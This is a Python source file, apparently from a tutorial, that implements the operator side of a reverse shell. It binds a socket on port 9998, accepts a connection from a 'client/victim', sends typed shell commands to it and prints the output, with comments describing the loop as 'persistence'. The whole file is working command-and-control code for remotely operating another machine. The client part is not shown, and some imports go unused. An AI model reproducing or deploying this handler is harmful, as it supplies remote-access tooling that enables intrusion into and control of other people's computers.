import socket
import sys  #allows for command line arguments to be used in python
import threading
import time
from queue import Queue


#Creates a socket (a connection between two computers)
def create_socket():
    try:
        global host
        global port
        global s
        host = ''
        port = 9998
        s = socket.socket()

    except socket.error as msg:
        print('Socket creation error' + str(msg))


# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s

        print('Binding to Port: ' + str(port))

        s.bind((host,port))

        # number consists of max num of queued connections
        # server hear will listen on the port for connection attempts from other computers
        s.listen(5)

    except socket.error as msg:
        print("Socket binding error " + str(msg) + "\n" +"Retrying")
        bind_socket()


# Establish connection with a client
def socket_accept():
    conn,address = s.accept()
    print("Connection has been established. IP"+ address[0] + "| Port " +str(address[1]))
    send_commands(conn)
    conn.close()


# send commands to ONE client/victim or a friend :)
def send_commands(conn):
    # The infinite loop creates persistence of listening for connections
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()

        # a command length of 0 means no arguments were
        # entered into the terminal, in that case, nothing will
        # be sent to the client
        if len(str.encode(cmd)) > 0:
            # sends entered command to the client
            conn.send(str.encode(cmd))

            # converts byte-code response from client into  a string
            client_response = str(conn.recv(1024), "utf-8")
            print(client_response, end="")




if __name__ == '__main__':
    create_socket()
    bind_socket()
    socket_accept()